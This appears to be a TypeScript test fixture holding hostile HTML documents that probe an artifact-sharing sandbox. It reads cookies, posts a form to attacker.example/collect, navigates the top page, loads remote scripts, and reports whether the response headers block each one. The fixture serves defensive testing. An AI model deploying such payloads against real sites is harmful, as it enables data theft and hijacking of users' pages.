/**
 * Documents that try to leave the sandbox. Each one reports what happened into
 * its own body, so a browser test can read the outcome out of the frame. The
 * response headers are what stop them; nothing here is rewritten on the way
 * out.
 */
function document_(attempt: string, script: string): string {
  return `<!doctype html><html><head><title>${attempt}</title></head><body>
<p id="outcome">no result</p>
<script>
  const report = (text) => { document.getElementById("outcome").textContent = text; };
  try { ${script} } catch (error) { report("BLOCKED: " + error.name); }
</script>
</body></html>`;
}

export const HOSTILE_ARTIFACTS: Record<string, string> = {
  "reads the parent DOM": document_(
    "parent dom",
    `parent.document.title = "taken"; report("ALLOWED: read the parent");`,
  ),

  "reads cookies": document_("cookies", `report("COOKIES[" + document.cookie + "]");`),

  "reads local storage": document_(
    "storage",
    `localStorage.setItem("x", "1"); report("ALLOWED: wrote storage");`,
  ),

  "calls the application API": document_(
    "api",
    `fetch("https://share.acme.example/api/artifacts", { credentials: "include" })
       .then(() => report("ALLOWED: called the API"))
       .catch((error) => report("BLOCKED: " + error.name));`,
  ),

  "submits a form": document_(
    "form",
    `document.body.insertAdjacentHTML("beforeend",
       '<form id="f" action="https://attacker.example/collect" method="post"><input name="x" value="y"></form>');
     document.getElementById("f").submit();
     report("SUBMITTED");`,
  ),

  "opens a window": document_(
    "window",
    `const opened = window.open("https://attacker.example/");
     report(opened ? "ALLOWED: opened a window" : "BLOCKED: window.open returned null");`,
  ),

  "asks the page to open a tab without a click": document_(
    "open request",
    `parent.postMessage({ portego: 1, type: "open", url: "https://attacker.example/" }, "*");
     report("SENT: asked for a tab");`,
  ),

  "navigates the top page": document_(
    "top navigation",
    `top.location = "https://attacker.example/"; report("ALLOWED: navigated the top page");`,
  ),

  "registers a service worker": document_(
    "service worker",
    `if (!navigator.serviceWorker) { report("BLOCKED: no service worker interface"); }
     else navigator.serviceWorker.register("/sw.js")
       .then(() => report("ALLOWED: registered a worker"))
       .catch((error) => report("BLOCKED: " + error.name));`,
  ),

  "loads a remote script": `<!doctype html><html><head><title>remote script</title></head><body>
<p id="outcome">no result</p>
<script src="https://attacker.example/x.js"></script>
</body></html>`,

  "loads a remote image": `<!doctype html><html><head><title>remote image</title></head><body>
<p id="outcome">no result</p>
<img src="https://attacker.example/pixel.png" alt="">
</body></html>`,

  "frames another page": `<!doctype html><html><head><title>frame</title></head><body>
<p id="outcome">no result</p>
<iframe src="https://share.acme.example/"></iframe>
</body></html>`,

  "rewrites relative URLs with a base element": `<!doctype html><html><head><title>base</title>
<base href="https://attacker.example/"></head><body>
<p id="outcome">no result</p>
<img src="pixel.png" alt="">
</body></html>`,
};

/** What a real artifact looks like: inline script and style, no network. */
export const SELF_CONTAINED_ARTIFACT = `<!doctype html><html><head><title>Chart</title>
  <style>body { font-family: system-ui; }</style></head>
  <body><div id="root"></div>
  <script>document.getElementById("root").textContent = "rendered";</script>
  </body></html>`;
